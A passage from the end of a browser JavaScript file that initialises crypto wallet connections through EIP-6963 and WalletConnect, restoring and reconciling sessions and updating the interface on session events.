    setupEIP6963();

    if (isMobileDevice) {
      logDebug('📱 Pre-warming WalletConnect on mobile…');
      await initWalletConnect({ useFallbackId: false }).catch(() => {});
    }

    await restoreWalletConnection();

    // Page-return reconciliation — this is what fixes the split-brain.
    if (document.visibilityState === 'hidden') {
      document.addEventListener('visibilitychange', () => {
        if (document.visibilityState === 'visible') reconcilePendingSession();
      }, { once: false });
    }
    // Also try immediately in case we're already back.
    await reconcilePendingSession();
  } catch (err) {
    logDebug('Fatal: ' + err.message);
    showStatus('Failed to load wallet libraries', 'error');
    return;
  }

  // ==========================================================================
  //  GLOBAL WALLETCONNECT EVENTS
  // ==========================================================================
  setTimeout(() => {
    if (!client) return;
    client.on('session_update', ({ params }) => {
      const accounts = params.namespaces?.eip155?.accounts;
      if (accounts?.length) {
        const a = accounts[0].split(':')[2];
        updateConnectedUI(a, 'evm');
        saveWallet(a, currentSession, 'evm');
        publishGlobalState(a, 'evm', activeProvider);
      }
    });
    client.on('session_delete', () => {
      resetConnectedUI();
      clearSavedWallet();
    });
    // Note: session_connect is intentionally NOT subscribed here — it's
    // subscribed per-connect inside connectViaWalletConnect to avoid
    // duplicate handlers.
  }, 800);

  if (window.ethereum && isDesktopDevice) {
    setupEVMProviderEvents(window.ethereum);
  }

  window.addEventListener('beforeunload', () => {
    if (modal) { try { modal.closeModal(); } catch {} }
  });

  logDebug(`✅ main.js ready — Platform: ${getPlatform()} | mobile=${isMobileDevice}`);
  console.log('✅ main.js ready — test with testTelegram("hi")');
})();
